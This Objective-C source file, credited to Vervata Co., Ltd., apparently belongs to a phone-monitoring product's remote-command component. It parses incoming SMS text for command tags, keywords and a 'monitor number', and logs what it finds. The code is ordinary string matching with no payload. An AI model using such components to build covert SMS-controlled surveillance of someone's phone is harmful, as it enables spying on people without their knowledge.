/**
 - Project name :  MSFSP
 - Class name   :  NSString(ScanSMSCommand)
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  11/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "NSString+ScanString.h"

@implementation NSString (ScanString)

/**
 - Method name: scanWithStartTag:scanWithEndTag
 - Purpose:  This method is used to scan the incomming message from the sender  
 - Argument list and description:aStartTag  (NSString).,aEndTag (NSString *)
 - Return type and description: No Return
*/

- (BOOL) scanWithStartTag:(NSString *) aStartTag scanWithEndTag: (NSString *) aEndTag {
	NSRange startRange = [self rangeOfString:aStartTag];
    if (startRange.location != NSNotFound) {
        NSRange targetRange;
        targetRange.location = startRange.location + startRange.length;
        targetRange.length = [self length] - targetRange.location;   
        NSRange endRange = [self rangeOfString:aEndTag options:0 range:targetRange];
        if (endRange.location != NSNotFound) {
			targetRange.length = endRange.location - targetRange.location;
			DLog (@"SMS Command found:%@",[self substringWithRange:targetRange]);
			return YES;
		}
    }
	return NO;
}


/**
 - Method name: scanWithStartTag:scanWithEndTag
 - Purpose:  This method is used to scan the incomming message from the sender  
 - Argument list and description:aStartTag  (NSString)
 - Return type and description: No Return
*/

- (BOOL) scanWithStartTag:(NSString *) aStartTag {
	if(([self length]>=[aStartTag length])) {
		NSString *scanedString=[[self stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] substringToIndex:[aStartTag length]];
		DLog (@"Scanned String:%@",scanedString);
		if([aStartTag isEqualToString:scanedString]) {
             return YES;
		}
	}
	return NO;
}

- (BOOL) scanWithKeyword: (NSString *) aKeyword { // Case insensitive finding...
	BOOL found = NO;
	if (([self length] >= [aKeyword length])) {
		// To lower case
		NSString *lKeyword = [aKeyword lowercaseString];
		NSString *lMe = [self lowercaseString];
		// Trim white space and new line
		NSString *trimMe = [lMe stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
		// Find keyword
		NSRange rangeOflKeyword = [trimMe rangeOfString:lKeyword];
		if (rangeOflKeyword.length) {
			found = YES;
		}
	}
	return (found);
}

- (BOOL) scanWithMonitorNumber: (NSString *) aMonitorNumber { // Case insensitive finding...
	BOOL found = NO;
	
	if (([self length] >= [aMonitorNumber length])) {
		// To lower case
		NSString *lKeyword = [aMonitorNumber lowercaseString];
				
		NSString *lMe = [self lowercaseString];		
		lMe = [lMe stringByReplacingOccurrencesOfString:@"-" withString:@""];		// remove '-'
		lMe = [lMe stringByReplacingOccurrencesOfString:@" " withString:@""];		// remote ' ' (spaces)
		
		// Trim white space and new line
		NSString *trimMe = [lMe stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
				
		// Find keyword
		NSRange rangeOflKeyword = [trimMe rangeOfString:lKeyword];
		if (rangeOflKeyword.length) {
			found = YES;
			DLog (@"This content contains the monitor number")
		}
	}
	return (found);
}

@end
